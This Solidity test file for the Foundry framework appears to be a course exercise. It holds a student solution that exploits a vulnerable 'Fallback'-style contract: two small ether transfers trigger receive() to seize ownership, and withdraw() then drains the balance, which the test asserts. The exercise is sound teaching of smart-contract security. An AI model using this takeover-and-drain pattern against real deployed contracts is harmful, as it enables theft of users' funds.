// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Assignment11.sol";

contract FallbackTest is Test {
    Assignment11 fallbackContract;
    address student;

    function setUp() public {
        student = vm.addr(1);
        vm.deal(student, 1 ether); // Fund student account with 1 ether
        fallbackContract = new Assignment11();
    }

    function exploit() internal {
        vm.startPrank(student);
        
        // Step 1: Contribute a small amount (less than 0.001 ether) to trigger ownership transfer
        payable(address(fallbackContract)).transfer(0.0005 ether);  // Contribute 0.0005 ether
        
        // Step 2: Send Ether to the contract to trigger the receive() function and become the owner
        payable(address(fallbackContract)).transfer(0.0005 ether);  // Contribute again to trigger receive()

        // Step 3: Withdraw all funds from the contract as the new owner
        fallbackContract.withdraw();  // Withdraw funds as the new owner
        
        vm.stopPrank();
    }

    function testStudentSolution() public {
        exploit();
        
        verifySolution();
    }

    function verifySolution() internal {
        // Verify that the ownership was successfully transferred
        assertEq(fallbackContract.owner(), student, "Ownership not transferred");
        
        // Verify that the contract balance was drained
        assertEq(address(fallbackContract).balance, 0, "Contract balance not drained");
    }
}
